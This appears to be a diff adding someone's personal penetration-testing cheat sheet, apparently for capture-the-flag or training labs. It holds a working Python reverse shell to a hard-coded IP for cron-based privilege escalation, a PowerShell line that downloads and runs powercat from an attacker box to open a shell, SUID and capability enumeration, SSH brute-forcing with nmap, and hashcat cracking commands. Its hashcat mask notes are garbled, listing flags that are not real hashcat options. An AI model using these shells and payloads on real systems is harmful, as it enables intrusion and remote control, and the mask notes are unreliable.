@@ -1,0 +1,68 @@
+for rooting through crontab
+
+#!/bin/bash
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.50.72",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
+
+
+
+for downloading the file from local id to victim's machine in windows 
+powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKBOX_IP:8080/powercat.ps1');powercat -c ATTACKBOX_IP -p 1337 -e cmd"
+
+
+
+for finding anything throughout the machine
+find / -type f -name <file_name> -exec <function_to_execute> \; 2>>/dev/null
+
+
+correct PNG file's hex code is 
+89 50 4e 47 0d 0a 1a 0a 00 00 00 0d 49 48 44 52
+
+
+correct JPG file's hex code is
+FF D8 FF E0 00 10 4A 46 49 46 00 01
+
+
+
+we can crack passwords through hydra nmap and metasploit 
+
+nmap example command 
+nmap -p 22 --script ssh-brute --script-args userdb=/root/users demo.ine.local
+
+userdb is the file in which username exists 
+demo.ine.local is the site handle
+
+
+to find executable file for priv escaltion
+find / -type f -user root -perm -4000 -exec ls -ldb {} \; 2>>/dev/null
+
+
+basic enumeration using perl
+getcap -r / 2>/dev/null
+
+
+
+
+hashcat 
+-a {wordlist mode}
+  types of worlists -> 
+  -u (uppercase only) ?u?u?u?u
+  -l (lowercase only) ?l?l?l?l
+  -d (digit only)?d?d?d?d?d
+  -s (special character only) ?s?s?s?s
+  -b (hex values incuded) ?b?b?b?b?b
+  -a(everything) ?u?l?b?d
+-m {type of hash}
+
+
+
+command (normal & rules mode)
+hashcat -a 0 -m <id_number of the hash> <file_name> <wordlist> -r <rules_filename>
+
+command (combination) (in this we use 2 wordlists)
+hashcat -a 1 -m <id_number of the hash> <file_name> <wordlist1> <wordlist2>
+
+command for brute force method (if we know the length of the password)
+hashcat -a 3 -m <id_number> <filename> "character set"
+
+if we dont know the lenght 
+hashcat -a 3 -m <id_number> --increment --increment-min 2 --increment-max 5 <filename> "character set"
